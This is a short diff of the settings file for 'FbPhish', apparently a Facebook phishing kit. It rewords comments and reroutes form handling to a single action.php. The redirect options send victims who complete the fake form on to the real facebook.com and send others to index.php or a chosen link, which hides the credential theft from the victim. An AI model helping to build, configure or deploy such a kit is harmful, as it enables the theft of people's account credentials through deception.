@@ -6,21 +6,21 @@
 
 // FbPhish settings
 
-// If poeple come on register.php or login.php but did not submit the register/login form:
+// If poeple come on action.php but did not submitted a form:
 // HOME: Redirect to index.php
 // FACEBOOK: Redirect to facebook.com
 // NOT HOME OR FACEBOOK: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
 $config_option__287 = "home";
 
 //Config option 301:
-// If the form was completely filled in redirect to:
+// If a form was completely filled in redirect to:
 // HOME: Redirect to index.php
 // FACEBOOK: Redirect to facebook.com
 // NOT HOME OR FACEBOOK: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
 $config_option__301 = "facebook";
 
 //Config option 302:
-// If the form was NOT completely filled in redirect to:
+// If a form was NOT completely filled in redirect to:
 // HOME: Redirect to index.php
 // FACEBOOK: Redirect to facebook.com
 // NOT HOME OR FACEBOOK: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
